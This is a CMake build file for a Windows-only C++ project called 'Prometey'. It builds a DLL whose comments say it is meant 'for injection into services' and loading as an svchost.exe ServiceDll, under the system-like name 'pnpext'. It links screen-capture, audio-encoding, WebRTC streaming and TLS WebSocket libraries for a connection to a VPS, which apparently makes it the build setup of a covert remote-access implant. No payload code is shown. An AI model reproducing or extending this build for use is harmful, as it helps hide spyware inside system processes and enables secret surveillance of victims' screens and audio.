cmake_minimum_required(VERSION 3.16)
project(Prometey)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Windows target only
if(NOT WIN32)
    message(FATAL_ERROR "This project targets Windows only")
endif()

# WebRTC stream (libdatachannel): optional
set(USE_WEBRTC_STREAM OFF)
find_package(LibDataChannel CONFIG QUIET)
if(LibDataChannel_FOUND)
    set(USE_WEBRTC_STREAM ON)
    message(STATUS "WebRTC stream: LibDataChannel found")
else()
    message(STATUS "WebRTC stream: LibDataChannel not found")
endif()

# Opus audio codec (static)
find_package(Opus CONFIG REQUIRED)
message(STATUS "Opus found: ${Opus_DIR}")

# OpenSSL (for TLS-encrypted WebSocket to VPS)
find_package(OpenSSL REQUIRED)
message(STATUS "OpenSSL found: ${OPENSSL_VERSION}")

# Common compile settings
set(COMMON_DEFS
    WIN32_LEAN_AND_MEAN
    NOMINMAX
    _WIN32_WINNT=0x0A00
    UNICODE
    _UNICODE
)

set(COMMON_LIBS
    ws2_32
    gdiplus
    d3d11
    dxgi
    psapi
    pdh
    shlwapi
    shell32
    advapi32
    user32
    gdi32
    ole32
    mfplat
    mfuuid
    mf
    strmiids
    wtsapi32
    userenv
)

# Static CRT
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")

# ══════════════════════════════════════════════
# Target 1: DLL (for injection into services)
# ══════════════════════════════════════════════
add_library(PrometeyDll SHARED
    main.cpp
    dllmain.cpp
)
set_target_properties(PrometeyDll PROPERTIES
    OUTPUT_NAME "pnpext"
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin
    MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>"
)
target_compile_definitions(PrometeyDll PRIVATE ${COMMON_DEFS} BUILD_AS_DLL=1)
target_compile_options(PrometeyDll PRIVATE /W3 /O2 /EHsc /MP)
target_include_directories(PrometeyDll PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/third_party
)
target_link_libraries(PrometeyDll PRIVATE ${COMMON_LIBS} Opus::opus OpenSSL::SSL OpenSSL::Crypto)
target_sources(PrometeyDll PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/exports.def)
if(USE_WEBRTC_STREAM)
    target_sources(PrometeyDll PRIVATE webrtc_stream.cpp)
    target_compile_definitions(PrometeyDll PRIVATE USE_WEBRTC_STREAM=1)
    target_link_libraries(PrometeyDll PRIVATE LibDataChannel::LibDataChannel)
endif()

# EXE target removed — only DLL (svchost.exe ServiceDll) is used

# Copy config template to output
configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/host_config.json.template
    ${CMAKE_BINARY_DIR}/bin/host_config.json
    COPYONLY
)
